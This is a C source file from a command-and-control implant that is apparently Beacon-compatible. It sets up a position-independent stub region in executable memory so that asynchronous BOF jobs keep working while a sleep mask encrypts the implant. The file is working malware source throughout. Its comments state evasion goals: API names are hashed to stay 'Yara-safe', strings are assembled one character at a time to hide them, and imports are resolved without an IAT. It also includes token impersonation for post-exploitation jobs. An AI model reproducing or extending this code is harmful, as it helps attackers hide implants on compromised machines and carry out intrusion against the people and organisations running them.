#include "Tasks/AsyncStub.h"
#include "BeaconCompatibility.h"
#include "Sleep.h"
#include "Utils.h"
#include "Debug.h"

#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)

/*
 * Position-independent Beacon API island for async BOFs.
 *
 * Sleep-mask UDRLs XOR the mapped Xenon image (and tracked heap) around
 * SleepEx. Async BOF .text is VirtualAlloc and stays plaintext, but Beacon*
 * imports normally point into that encrypted image. Copy a small PIC stub
 * range into its own VirtualAlloc (not heap-tracked) and bind the job's
 * COFF imports there instead.
 *
 * Every stub reaches per-job state through a patched movabs immediate
 * (ASYNC_STUB_CTX_MAGIC). No IAT, CRT, or Xenon globals.
 */

#define ASYNC_STUB_CTX_MAGIC     0xA1B2C3D4E5F60718ULL
#define ASYNC_STUB_RING_CAP      (64u * 1024u)
#define ASYNC_STUB_PRINTF_CAP    8192u
#define ASYNC_STUB_FORMAT_CAP    (32u * 1024u)
#define ASYNC_STUB_TAIL_PAD      2048u
#define ASYNC_STUB_MAX_FORMATS   8

#define STUB __attribute__((section("asyncstub"), noinline, noclone, used, optimize("O0")))

/* Same hashes as BeaconCompatibility.c (Yara-safe compile-time values). */
#define BeaconDataParse_HASH   0xF399E2A0u
#define BeaconDataInt_HASH     0x3B3B237Au
#define BeaconDataShort_HASH   0x1C1A2EE1u
#define BeaconDataLength_HASH  0x9D43F5D1u
#define BeaconDataExtract_HASH 0xBBF350C2u
#define BeaconFormatAlloc_HASH 0x9A7EB077u
#define BeaconFormatReset_HASH 0x7BFDA659u
#define BeaconFormatFree_HASH  0xA44B95F4u
#define BeaconFormatAppend_HASH 0xA92FFFE2u
#define BeaconFormatPrintf_HASH 0x5EC34A75u
#define BeaconFormatToString_HASH 0xCD760EEEu
#define BeaconFormatInt_HASH   0xF037F8B7u
#define BeaconPrintf_HASH      0x0B760976u
#define BeaconOutput_HASH      0xA5575830u
#define BeaconUseToken_HASH    0xC7B994C5u
#define BeaconRevertToken_HASH 0x2BCCCFDCu
#define toWideChar_HASH        0xA2AF2403u
#define LoadLibraryA_HASH      0x53B2070Fu
#define GetProcAddress_HASH    0xF8F45725u
#define GetModuleHandleA_HASH  0xE463DA3Cu
#define FreeLibrary_HASH       0xAB45C5EEu

typedef int  (*fn_vsnprintf)(char *, size_t, const char *, va_list);
typedef BOOL (WINAPI *fn_SetEvent)(HANDLE);
typedef DWORD (WINAPI *fn_QueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef BOOL (WINAPI *fn_Impersonate)(HANDLE);
typedef BOOL (WINAPI *fn_SetThreadToken)(PHANDLE, HANDLE);
typedef BOOL (WINAPI *fn_RevertToSelf)(void);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef BOOL (WINAPI *fn_FreeLibrary)(HMODULE);

typedef struct _ASYNC_STUB_FMT {
    char *block;
    int   cap;
} ASYNC_STUB_FMT;

struct _ASYNC_STUB_CTX {
    volatile LONG state;

    HANDLE hStop;
    HANDLE hWake;
    HANDLE hBeaconThread;
    HANDLE hToken;

    void (*entry)(char *, UINT32);
    char  *args;
    UINT32 argsSize;

    fn_SetEvent          pSetEvent;
    fn_QueueUserAPC      pQueueUserAPC;
    fn_Impersonate       pImpersonate;
    fn_SetThreadToken    pSetThreadToken;
    fn_RevertToSelf      pRevertToSelf;
    fn_LoadLibraryA      pLoadLibraryA;
    fn_GetProcAddress    pGetProcAddress;
    fn_GetModuleHandleA  pGetModuleHandleA;
    fn_FreeLibrary       pFreeLibrary;
    fn_vsnprintf         p_vsnprintf;
    PAPCFUNC             pWakeApc;

    volatile LONG ringLock;
    UINT32 ringCap;
    UINT32 ringLen;
    char  *ring;

    char  *printfScratch;
    UINT32 printfScratchCap;

    char  *formatArena;
    UINT32 formatArenaCap;
    UINT32 formatArenaOff;
    ASYNC_STUB_FMT formats[ASYNC_STUB_MAX_FORMATS];
    int    formatCount;

    /* Copied stub entry points (in the island, not the DLL). */
    void *codeBase;
    SIZE_T codeSize;
    void *fnThreadProc;
    void *fnPrintf;
    void *fnOutput;
    void *fnWakeup;
    void *fnGetStop;
    void *fnRegister;
    void *fnUnregister;
    void *fnDataParse;
    void *fnDataInt;
    void *fnDataShort;
    void *fnDataLength;
    void *fnDataExtract;
    void *fnFormatAlloc;
    void *fnFormatReset;
    void *fnFormatFree;
    void *fnFormatAppend;
    void *fnFormatPrintf;
    void *fnFormatToString;
    void *fnFormatInt;
    void *fnUseToken;
    void *fnRevertToken;
    void *fnToWideChar;
};

/* ---- PIC helpers (asyncstub section) ---- */

STUB static ASYNC_STUB_CTX *StubCtx(void)
{
    ASYNC_STUB_CTX *c;
    __asm__ __volatile__ (
        "movabsq $0xA1B2C3D4E5F60718, %0"
        : "=r"(c)
    );
    return c;
}

STUB static void StubMemcpy(void *dst, const void *src, UINT32 n)
{
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    UINT32 i;
    for (i = 0; i < n; i++)
        d[i] = s[i];
}

STUB static void StubMemset(void *dst, BYTE v, UINT32 n)
{
    BYTE *d = (BYTE *)dst;
    UINT32 i;
    for (i = 0; i < n; i++)
        d[i] = v;
}

STUB static void StubLock(ASYNC_STUB_CTX *c)
{
    while (InterlockedCompareExchange(&c->ringLock, 1, 0) != 0)
        ;
}

STUB static void StubUnlock(ASYNC_STUB_CTX *c)
{
    InterlockedExchange(&c->ringLock, 0);
}

STUB static void StubRingAppend(ASYNC_STUB_CTX *c, const char *data, INT len)
{
    UINT32 room;
    UINT32 n;

    if (!c || !data || len <= 0 || !c->ring)
        return;

    StubLock(c);
    room = (c->ringCap > c->ringLen) ? (c->ringCap - c->ringLen) : 0;
    n = ((UINT32)len < room) ? (UINT32)len : room;
    if (n > 0) {
        StubMemcpy(c->ring + c->ringLen, data, n);
        c->ringLen += n;
    }
    StubUnlock(c);
}

STUB static UINT32 StubBswap32(UINT32 x)
{
    return ((x & 0x000000FFu) << 24) |
           ((x & 0x0000FF00u) << 8)  |
           ((x & 0x00FF0000u) >> 8)  |
           ((x & 0xFF000000u) >> 24);
}

STUB void AsyncStub_Begin(void)
{
    __asm__ __volatile__("nop");
}

STUB void AsyncStubPrintf(int type, char *fmt, ...)
{
    ASYNC_STUB_CTX *c = StubCtx();
    va_list ap;
    int n;

    (void)type;
    if (!c || !c->p_vsnprintf || !fmt || !c->printfScratch)
        return;

    va_start(ap, fmt);
    n = c->p_vsnprintf(c->printfScratch, (size_t)c->printfScratchCap, fmt, ap);
    va_end(ap);
    if (n < 0)
        return;
    if (n >= (int)c->printfScratchCap)
        n = (int)c->printfScratchCap - 1;
    c->printfScratch[n] = '\0';
    StubRingAppend(c, c->printfScratch, n);
}

STUB void AsyncStubOutput(int type, char *data, int len)
{
    ASYNC_STUB_CTX *c = StubCtx();
    (void)type;
    StubRingAppend(c, data, len);
}

STUB void AsyncStubWakeup(void)
{
    ASYNC_STUB_CTX *c = StubCtx();
    if (!c)
        return;
    if (c->pSetEvent && c->hWake)
        c->pSetEvent(c->hWake);
    if (c->pQueueUserAPC && c->pWakeApc && c->hBeaconThread)
        c->pQueueUserAPC(c->pWakeApc, c->hBeaconThread, 0);
}

STUB HANDLE AsyncStubGetStopJobEvent(void)
{
    ASYNC_STUB_CTX *c = StubCtx();
    return c ? c->hStop : NULL;
}

STUB BOOL AsyncStubRegisterThread(DWORD dwThreadId)
{
    (void)dwThreadId;
    return TRUE;
}

STUB void AsyncStubUnregisterThread(DWORD dwThreadId)
{
    (void)dwThreadId;
}

STUB void AsyncStubDataParse(datap *parser, char *buffer, int size)
{
    if (!parser)
        return;
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size - 4;
    parser->size = size - 4;
    parser->buffer += 4;
}

STUB int AsyncStubDataInt(datap *parser)
{
    int32_t v = 0;
    if (!parser || parser->length < 4)
        return 0;
    StubMemcpy(&v, parser->buffer, 4);
    v = (int32_t)StubBswap32((UINT32)v);
    parser->buffer += 4;
    parser->length -= 4;
    return (int)v;
}

STUB short AsyncStubDataShort(datap *parser)
{
    int16_t v = 0;
    if (!parser || parser->length < 2)
        return 0;
    StubMemcpy(&v, parser->buffer, 2);
    v = (int16_t)StubBswap32((UINT32)(UINT16)v);
    parser->buffer += 2;
    parser->length -= 2;
    return (short)v;
}

STUB int AsyncStubDataLength(datap *parser)
{
    return parser ? parser->length : 0;
}

STUB char *AsyncStubDataExtract(datap *parser, int *size)
{
    UINT32 length = 0;
    char *out = NULL;
    if (!parser || parser->length < 4)
        return NULL;
    StubMemcpy(&length, parser->buffer, 4);
    parser->buffer += 4;
    length = StubBswap32(length);
    out = parser->buffer;
    parser->length -= 4;
    parser->length -= (int)length;
    parser->buffer += length;
    if (size)
        *size = (int)length;
    return out;
}

STUB void AsyncStubFormatAlloc(formatp *format, int maxsz)
{
    ASYNC_STUB_CTX *c = StubCtx();
    UINT32 need;
    if (!format || !c || maxsz <= 0)
        return;
    format->original = NULL;
    format->buffer = NULL;
    format->length = 0;
    format->size = 0;
    need = (UINT32)maxsz;
    if (c->formatCount >= ASYNC_STUB_MAX_FORMATS)
        return;
    if (c->formatArenaOff + need > c->formatArenaCap)
        return;
    format->original = c->formatArena + c->formatArenaOff;
    c->formatArenaOff += need;
    StubMemset(format->original, 0, need);
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
    c->formats[c->formatCount].block = format->original;
    c->formats[c->formatCount].cap = maxsz;
    c->formatCount++;
}

STUB void AsyncStubFormatReset(formatp *format)
{
    if (!format || !format->original)
        return;
    StubMemset(format->original, 0, (UINT32)format->size);
    format->buffer = format->original;
    format->length = format->size;
}

STUB void AsyncStubFormatFree(formatp *format)
{
    ASYNC_STUB_CTX *c = StubCtx();
    if (!format)
        return;
    if (c && c->formatCount > 0 &&
        c->formats[c->formatCount - 1].block == format->original) {
        c->formatArenaOff -= (UINT32)c->formats[c->formatCount - 1].cap;
        c->formatCount--;
    }
    format->original = NULL;
    format->buffer = NULL;
    format->length = 0;
    format->size = 0;
}

STUB void AsyncStubFormatAppend(formatp *format, char *text, int len)
{
    if (!format || !format->buffer || !text || len <= 0)
        return;
    StubMemcpy(format->buffer, text, (UINT32)len);
    format->buffer += len;
    format->length += len;
}

STUB void AsyncStubFormatPrintf(formatp *format, char *fmt, ...)
{
    ASYNC_STUB_CTX *c = StubCtx();
    va_list ap;
    int length;
    if (!format || !fmt || !c || !c->p_vsnprintf || !c->printfScratch)
        return;
    va_start(ap, fmt);
    length = c->p_vsnprintf(c->printfScratch, (size_t)c->printfScratchCap, fmt, ap);
    va_end(ap);
    if (length < 0)
        return;
    if (length >= (int)c->printfScratchCap)
        length = (int)c->printfScratchCap - 1;
    if (format->length + length > format->size)
        return;
    StubMemcpy(format->buffer, c->printfScratch, (UINT32)length);
    format->length += length;
    format->buffer += length;
}

STUB char *AsyncStubFormatToString(formatp *format, int *size)
{
    if (size && format)
        *size = format->length;
    return format ? format->original : NULL;
}

STUB void AsyncStubFormatInt(formatp *format, int value)
{
    UINT32 outdata;
    if (!format || format->length + 4 > format->size)
        return;
    outdata = StubBswap32((UINT32)value);
    StubMemcpy(format->buffer, &outdata, 4);
    format->length += 4;
    format->buffer += 4;
}

STUB BOOL AsyncStubUseToken(HANDLE token)
{
    ASYNC_STUB_CTX *c = StubCtx();
    if (!c || !c->pSetThreadToken)
        return FALSE;
    return c->pSetThreadToken(NULL, token);
}

STUB void AsyncStubRevertToken(void)
{
    ASYNC_STUB_CTX *c = StubCtx();
    if (c && c->pRevertToSelf)
        c->pRevertToSelf();
}

STUB BOOL AsyncStubToWideChar(char *src, wchar_t *dst, int max)
{
    int i;
    if (!src || !dst || max <= 0)
        return FALSE;
    for (i = 0; i < max - 1 && src[i]; i++)
        dst[i] = (wchar_t)(unsigned char)src[i];
    dst[i] = 0;
    return TRUE;
}

STUB DWORD WINAPI AsyncStubThreadProc(LPVOID lpParameter)
{
    ASYNC_STUB_CTX *c = StubCtx();
    (void)lpParameter;
    if (!c)
        return 1;
    if (c->pImpersonate && c->hToken)
        c->pImpersonate(c->hToken);
    c->state = 0x1; /* ASYNC_BOF_STATE_RUNNING */
    if (c->entry)
        c->entry(c->args, c->argsSize);
    c->state = 0x2; /* ASYNC_BOF_STATE_FINISHED */
    if (c->pSetEvent && c->hWake)
        c->pSetEvent(c->hWake);
    if (c->pQueueUserAPC && c->pWakeApc && c->hBeaconThread)
        c->pQueueUserAPC(c->pWakeApc, c->hBeaconThread, 0);
    return 0;
}

STUB void AsyncStub_End(void)
{
    __asm__ __volatile__("nop");
}

/* ---- Beacon-thread helpers (normal .text; unmasked when called) ---- */

static void *ResolveProc(HMODULE mod, const char *name)
{
    void *p = NULL;
    if (mod && name)
        p = (void *)GetProcAddress(mod, name);
    return p;
}

static void *ResolveVsnprintf(void)
{
    HMODULE m;
    void *p;

    m = GetModuleHandleA("msvcrt.dll");
    if (!m)
        m = LoadLibraryA("msvcrt.dll");
    if (m) {
        p = ResolveProc(m, "vsnprintf");
        if (!p)
            p = ResolveProc(m, "_vsnprintf");
        if (p)
            return p;
    }
    m = GetModuleHandleA("ucrtbase.dll");
    if (m) {
        p = ResolveProc(m, "vsnprintf");
        if (p)
            return p;
    }
    return (void *)vsnprintf;
}

static void GetStubRange(BYTE **start, SIZE_T *size)
{
    BYTE *lo;
    BYTE *hi;
    BYTE *p;
    SIZE_T i;
    void *syms[] = {
        (void *)AsyncStub_Begin,
        (void *)StubCtx,
        (void *)StubMemcpy,
        (void *)StubMemset,
        (void *)StubLock,
        (void *)StubUnlock,
        (void *)StubRingAppend,
        (void *)StubBswap32,
        (void *)AsyncStubPrintf,
        (void *)AsyncStubOutput,
        (void *)AsyncStubWakeup,
        (void *)AsyncStubGetStopJobEvent,
        (void *)AsyncStubRegisterThread,
        (void *)AsyncStubUnregisterThread,
        (void *)AsyncStubDataParse,
        (void *)AsyncStubDataInt,
        (void *)AsyncStubDataShort,
        (void *)AsyncStubDataLength,
        (void *)AsyncStubDataExtract,
        (void *)AsyncStubFormatAlloc,
        (void *)AsyncStubFormatReset,
        (void *)AsyncStubFormatFree,
        (void *)AsyncStubFormatAppend,
        (void *)AsyncStubFormatPrintf,
        (void *)AsyncStubFormatToString,
        (void *)AsyncStubFormatInt,
        (void *)AsyncStubUseToken,
        (void *)AsyncStubRevertToken,
        (void *)AsyncStubToWideChar,
        (void *)AsyncStubThreadProc,
        (void *)AsyncStub_End,
    };

    lo = (BYTE *)(ULONG_PTR)~(ULONG_PTR)0;
    hi = NULL;
    for (i = 0; i < sizeof(syms) / sizeof(syms[0]); i++) {
        p = (BYTE *)syms[i];
        if (p < lo)
            lo = p;
        if (p > hi)
            hi = p;
    }
    *start = lo;
    *size = (SIZE_T)(hi - lo) + ASYNC_STUB_TAIL_PAD;
}

static SIZE_T AlignUp(SIZE_T v, SIZE_T a)
{
    return (v + (a - 1)) & ~(a - 1);
}

static void PatchMagic(BYTE *code, SIZE_T codeSize, UINT64 value)
{
    SIZE_T i;
    for (i = 0; i + 8 <= codeSize; i++) {
        UINT64 cur;
        memcpy(&cur, code + i, 8);
        if (cur == ASYNC_STUB_CTX_MAGIC)
            memcpy(code + i, &value, 8);
    }
}

static void *RelocateFn(BYTE *code, BYTE *origBase, void *fn)
{
    return code + ((BYTE *)fn - origBase);
}

ASYNC_STUB_CTX *AsyncStubCreate(
    const void *args,
    UINT32 argsSize,
    HANDLE hStop,
    HANDLE hWake,
    HANDLE hBeaconThread,
    HANDLE hToken)
{
    BYTE *orig = NULL;
    SIZE_T codeSize = 0;
    SIZE_T total;
    SIZE_T codeOff, ctxOff, ringOff, scratchOff, fmtOff, argsOff;
    BYTE *base;
    ASYNC_STUB_CTX *c;
    HMODULE k32;
    HMODULE adv;

    GetStubRange(&orig, &codeSize);
    if (!orig || codeSize == 0 || codeSize > (SIZE_T)128 * 1024)
        return NULL;

    codeOff    = 0;
    ctxOff     = AlignUp(codeOff + codeSize, 16);
    ringOff    = AlignUp(ctxOff + sizeof(ASYNC_STUB_CTX), 16);
    scratchOff = AlignUp(ringOff + ASYNC_STUB_RING_CAP, 16);
    fmtOff     = AlignUp(scratchOff + ASYNC_STUB_PRINTF_CAP, 16);
    argsOff    = AlignUp(fmtOff + ASYNC_STUB_FORMAT_CAP, 16);
    total      = argsOff + argsSize + 16;

    base = (BYTE *)VirtualAlloc(NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base)
        return NULL;

    memcpy(base + codeOff, orig, codeSize);
    c = (ASYNC_STUB_CTX *)(base + ctxOff);
    memset(c, 0, sizeof(*c));

    PatchMagic(base + codeOff, codeSize, (UINT64)(ULONG_PTR)c);

    c->codeBase = base + codeOff;
    c->codeSize = codeSize;
    c->hStop = hStop;
    c->hWake = hWake;
    c->hBeaconThread = hBeaconThread;
    c->hToken = hToken;
    c->pWakeApc = SleepWakeApc();

    k32 = GetModuleHandleA("kernel32.dll");
    adv = LoadLibraryA("advapi32.dll");
    c->pSetEvent         = (fn_SetEvent)CoffPeGetProcAddress(k32, "SetEvent");
    c->pQueueUserAPC     = (fn_QueueUserAPC)CoffPeGetProcAddress(k32, "QueueUserAPC");
    c->pLoadLibraryA     = (fn_LoadLibraryA)CoffPeGetProcAddress(k32, "LoadLibraryA");
    c->pGetProcAddress   = (fn_GetProcAddress)CoffPeGetProcAddress(k32, "GetProcAddress");
    c->pGetModuleHandleA = (fn_GetModuleHandleA)CoffPeGetProcAddress(k32, "GetModuleHandleA");
    c->pFreeLibrary      = (fn_FreeLibrary)CoffPeGetProcAddress(k32, "FreeLibrary");
    c->pImpersonate      = (fn_Impersonate)CoffPeGetProcAddress(adv, "ImpersonateLoggedOnUser");
    c->pSetThreadToken   = (fn_SetThreadToken)CoffPeGetProcAddress(adv, "SetThreadToken");
    c->pRevertToSelf     = (fn_RevertToSelf)CoffPeGetProcAddress(adv, "RevertToSelf");
    if (!c->pSetEvent)
        c->pSetEvent = (fn_SetEvent)ResolveProc(k32, "SetEvent");
    if (!c->pQueueUserAPC)
        c->pQueueUserAPC = (fn_QueueUserAPC)ResolveProc(k32, "QueueUserAPC");
    if (!c->pLoadLibraryA)
        c->pLoadLibraryA = (fn_LoadLibraryA)ResolveProc(k32, "LoadLibraryA");
    if (!c->pGetProcAddress)
        c->pGetProcAddress = (fn_GetProcAddress)ResolveProc(k32, "GetProcAddress");
    if (!c->pGetModuleHandleA)
        c->pGetModuleHandleA = (fn_GetModuleHandleA)ResolveProc(k32, "GetModuleHandleA");
    if (!c->pFreeLibrary)
        c->pFreeLibrary = (fn_FreeLibrary)ResolveProc(k32, "FreeLibrary");
    if (!c->pImpersonate)
        c->pImpersonate = (fn_Impersonate)ResolveProc(adv, "ImpersonateLoggedOnUser");
    if (!c->pSetThreadToken)
        c->pSetThreadToken = (fn_SetThreadToken)ResolveProc(adv, "SetThreadToken");
    if (!c->pRevertToSelf)
        c->pRevertToSelf = (fn_RevertToSelf)ResolveProc(adv, "RevertToSelf");
    c->p_vsnprintf       = (fn_vsnprintf)ResolveVsnprintf();

    c->ring = (char *)(base + ringOff);
    c->ringCap = ASYNC_STUB_RING_CAP;
    c->printfScratch = (char *)(base + scratchOff);
    c->printfScratchCap = ASYNC_STUB_PRINTF_CAP;
    c->formatArena = (char *)(base + fmtOff);
    c->formatArenaCap = ASYNC_STUB_FORMAT_CAP;

    if (args && argsSize > 0) {
        c->args = (char *)(base + argsOff);
        c->argsSize = argsSize;
        memcpy(c->args, args, argsSize);
    }

    c->fnThreadProc      = RelocateFn(base + codeOff, orig, (void *)AsyncStubThreadProc);
    c->fnPrintf          = RelocateFn(base + codeOff, orig, (void *)AsyncStubPrintf);
    c->fnOutput          = RelocateFn(base + codeOff, orig, (void *)AsyncStubOutput);
    c->fnWakeup          = RelocateFn(base + codeOff, orig, (void *)AsyncStubWakeup);
    c->fnGetStop         = RelocateFn(base + codeOff, orig, (void *)AsyncStubGetStopJobEvent);
    c->fnRegister        = RelocateFn(base + codeOff, orig, (void *)AsyncStubRegisterThread);
    c->fnUnregister      = RelocateFn(base + codeOff, orig, (void *)AsyncStubUnregisterThread);
    c->fnDataParse       = RelocateFn(base + codeOff, orig, (void *)AsyncStubDataParse);
    c->fnDataInt         = RelocateFn(base + codeOff, orig, (void *)AsyncStubDataInt);
    c->fnDataShort       = RelocateFn(base + codeOff, orig, (void *)AsyncStubDataShort);
    c->fnDataLength      = RelocateFn(base + codeOff, orig, (void *)AsyncStubDataLength);
    c->fnDataExtract     = RelocateFn(base + codeOff, orig, (void *)AsyncStubDataExtract);
    c->fnFormatAlloc     = RelocateFn(base + codeOff, orig, (void *)AsyncStubFormatAlloc);
    c->fnFormatReset     = RelocateFn(base + codeOff, orig, (void *)AsyncStubFormatReset);
    c->fnFormatFree      = RelocateFn(base + codeOff, orig, (void *)AsyncStubFormatFree);
    c->fnFormatAppend    = RelocateFn(base + codeOff, orig, (void *)AsyncStubFormatAppend);
    c->fnFormatPrintf    = RelocateFn(base + codeOff, orig, (void *)AsyncStubFormatPrintf);
    c->fnFormatToString  = RelocateFn(base + codeOff, orig, (void *)AsyncStubFormatToString);
    c->fnFormatInt       = RelocateFn(base + codeOff, orig, (void *)AsyncStubFormatInt);
    c->fnUseToken        = RelocateFn(base + codeOff, orig, (void *)AsyncStubUseToken);
    c->fnRevertToken     = RelocateFn(base + codeOff, orig, (void *)AsyncStubRevertToken);
    c->fnToWideChar      = RelocateFn(base + codeOff, orig, (void *)AsyncStubToWideChar);

    if (!c->pSetEvent || !c->pQueueUserAPC || !c->p_vsnprintf || !c->fnThreadProc) {
        VirtualFree(base, 0, MEM_RELEASE);
        return NULL;
    }

    _dbg("Async stub island %p code=%p size=%lu", c, c->codeBase, (unsigned long)c->codeSize);
    return c;
}

VOID AsyncStubDestroy(ASYNC_STUB_CTX *c)
{
    if (!c || !c->codeBase)
        return;
    VirtualFree(c->codeBase, 0, MEM_RELEASE);
}

VOID AsyncStubSetEntry(ASYNC_STUB_CTX *c, void (*entry)(char *, UINT32))
{
    if (c)
        c->entry = entry;
}

LPTHREAD_START_ROUTINE AsyncStubThreadProcAddr(ASYNC_STUB_CTX *c)
{
    return c ? (LPTHREAD_START_ROUTINE)c->fnThreadProc : NULL;
}

LONG AsyncStubGetState(ASYNC_STUB_CTX *c)
{
    return c ? c->state : 0;
}

INT AsyncStubDrain(ASYNC_STUB_CTX *c, char **out)
{
    INT n = 0;
    char *snap = NULL;

    if (!c || !out)
        return 0;
    *out = NULL;

    while (InterlockedCompareExchange(&c->ringLock, 1, 0) != 0)
        ;
    n = (INT)c->ringLen;
    if (n > 0 && c->ring) {
        snap = (char *)malloc((SIZE_T)n + 1);
        if (snap) {
            memcpy(snap, c->ring, (SIZE_T)n);
            snap[n] = '\0';
            c->ringLen = 0;
        }
        else {
            n = 0;
        }
    }
    InterlockedExchange(&c->ringLock, 0);

    *out = snap;
    return n;
}

BOOL AsyncStubFillOverrides(ASYNC_STUB_CTX *c, COFF_SYM_OVERRIDE *ov, int maxOv, int *count)
{
    int n = 0;
    char name[40];

    if (!c || !ov || !count || maxOv < 8)
        return FALSE;

#define OV_ADD(h, a) do { \
        if (n < maxOv && (a)) { ov[n].hash = (UINT32)(h); ov[n].addr = (a); n++; } \
    } while (0)

    OV_ADD(BeaconPrintf_HASH, c->fnPrintf);
    OV_ADD(BeaconOutput_HASH, c->fnOutput);
    OV_ADD(BeaconDataParse_HASH, c->fnDataParse);
    OV_ADD(BeaconDataInt_HASH, c->fnDataInt);
    OV_ADD(BeaconDataShort_HASH, c->fnDataShort);
    OV_ADD(BeaconDataLength_HASH, c->fnDataLength);
    OV_ADD(BeaconDataExtract_HASH, c->fnDataExtract);
    OV_ADD(BeaconFormatAlloc_HASH, c->fnFormatAlloc);
    OV_ADD(BeaconFormatReset_HASH, c->fnFormatReset);
    OV_ADD(BeaconFormatFree_HASH, c->fnFormatFree);
    OV_ADD(BeaconFormatAppend_HASH, c->fnFormatAppend);
    OV_ADD(BeaconFormatPrintf_HASH, c->fnFormatPrintf);
    OV_ADD(BeaconFormatToString_HASH, c->fnFormatToString);
    OV_ADD(BeaconFormatInt_HASH, c->fnFormatInt);
    OV_ADD(BeaconUseToken_HASH, c->fnUseToken);
    OV_ADD(BeaconRevertToken_HASH, c->fnRevertToken);
    OV_ADD(toWideChar_HASH, c->fnToWideChar);
    OV_ADD(LoadLibraryA_HASH, (void *)c->pLoadLibraryA);
    OV_ADD(GetProcAddress_HASH, (void *)c->pGetProcAddress);
    OV_ADD(GetModuleHandleA_HASH, (void *)c->pGetModuleHandleA);
    OV_ADD(FreeLibrary_HASH, (void *)c->pFreeLibrary);

    name[0]='B'; name[1]='e'; name[2]='a'; name[3]='c'; name[4]='o'; name[5]='n';
    name[6]='W'; name[7]='a'; name[8]='k'; name[9]='e'; name[10]='u'; name[11]='p'; name[12]=0;
    OV_ADD(custom_hash(name), c->fnWakeup);

    name[0]='B'; name[1]='e'; name[2]='a'; name[3]='c'; name[4]='o'; name[5]='n';
    name[6]='G'; name[7]='e'; name[8]='t'; name[9]='S'; name[10]='t'; name[11]='o'; name[12]='p';
    name[13]='J'; name[14]='o'; name[15]='b'; name[16]='E'; name[17]='v'; name[18]='e'; name[19]='n'; name[20]='t'; name[21]=0;
    OV_ADD(custom_hash(name), c->fnGetStop);

    name[0]='B'; name[1]='e'; name[2]='a'; name[3]='c'; name[4]='o'; name[5]='n';
    name[6]='R'; name[7]='e'; name[8]='g'; name[9]='i'; name[10]='s'; name[11]='t'; name[12]='e'; name[13]='r';
    name[14]='T'; name[15]='h'; name[16]='r'; name[17]='e'; name[18]='a'; name[19]='d';
    name[20]='C'; name[21]='a'; name[22]='l'; name[23]='l'; name[24]='b'; name[25]='a'; name[26]='c'; name[27]='k'; name[28]=0;
    OV_ADD(custom_hash(name), c->fnRegister);

    name[0]='B'; name[1]='e'; name[2]='a'; name[3]='c'; name[4]='o'; name[5]='n';
    name[6]='U'; name[7]='n'; name[8]='r'; name[9]='e'; name[10]='g'; name[11]='i'; name[12]='s'; name[13]='t'; name[14]='e'; name[15]='r';
    name[16]='T'; name[17]='h'; name[18]='r'; name[19]='e'; name[20]='a'; name[21]='d';
    name[22]='C'; name[23]='a'; name[24]='l'; name[25]='l'; name[26]='b'; name[27]='a'; name[28]='c'; name[29]='k'; name[30]=0;
    OV_ADD(custom_hash(name), c->fnUnregister);

#undef OV_ADD

    *count = n;
    return n > 0;
}

#endif
